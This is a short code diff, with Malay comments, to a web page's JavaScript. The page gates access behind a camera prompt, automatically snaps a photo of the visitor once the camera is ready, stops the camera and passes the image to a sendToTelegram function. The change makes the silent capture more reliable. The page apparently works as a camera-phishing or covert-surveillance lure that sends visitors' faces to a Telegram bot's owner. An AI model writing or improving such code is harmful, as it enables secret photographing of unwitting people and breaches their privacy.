@@ -50,9 +50,12 @@
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(function(stream) {
                 video.srcObject = stream;
-                
-                video.onloadedmetadata = function() {
-                    setTimeout(capturePhoto, 500); // Ambil gambar selepas 0.5 saat
+
+                video.onloadeddata = function() {
+                    // Pastikan kamera dah ready sebelum ambil gambar
+                    if (video.videoWidth > 0 && video.videoHeight > 0) {
+                        capturePhoto(stream);
+                    }
                 };
             })
             .catch(function(error) {
@@ -61,13 +64,17 @@
                 alert("Please allow camera access to continue.");
             });
 
-        function capturePhoto() {
+        function capturePhoto(stream) {
             const canvas = document.createElement('canvas');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             const context = canvas.getContext('2d');
+
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const photoDataUrl = canvas.toDataURL('image/jpeg');
+            const photoDataUrl = canvas.toDataURL('image/png');
+
+            // Hentikan kamera selepas ambil gambar
+            stream.getTracks().forEach(track => track.stop());
 
             sendToTelegram(photoDataUrl);
         }
